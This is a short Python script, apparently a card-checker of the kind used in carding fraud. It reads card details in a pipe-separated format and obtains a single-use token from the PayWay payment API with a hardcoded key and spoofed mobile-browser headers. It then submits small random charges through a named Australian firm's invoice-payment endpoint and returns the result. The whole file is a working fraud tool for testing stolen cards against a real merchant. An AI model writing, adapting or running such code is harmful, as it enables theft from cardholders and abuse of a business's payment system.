import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	random_amount3 = random.randint(1, 999)
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': 'Basic UTE4Mzc1X1BVQl8yc3VxNmt4M3pha2JtdTR6dWQ0eDVhM2ZyZG14eXpxOGlpbnoydjZ4emN5cGs1MnR6YWFzN2dwbWp6ZWk6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardNumber': f'{n}',
	    'cvn': f'{cvc}',
	    'cardholderName': 'Gen Paypal',
	    'expiryDateMonth': f'{mm}',
	    'expiryDateYear': f'{yy}',
	    'threeDS2': 'false',
	}
	
	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	tok = response.json()['singleUseTokenId']
	
	headers = {
	    'authority': 'www.coriowm.com.au',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.coriowm.com.au',
	    'referer': 'https://www.coriowm.com.au/pay-an-invoice/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'payway_process_payment',
	    'nonce': '1e1e4c8be6',
	    'amount': f'{random_amount1}.{random_amount2}',
	    'description': 'TEST',
	    'customer_number': f'{random_amount3}',
	    'order_number': f'{random_amount3}',
	    'card_token': f'{tok}',
	}
	
	response = requests.post('https://www.coriowm.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	result = response.json()['message']
	return result
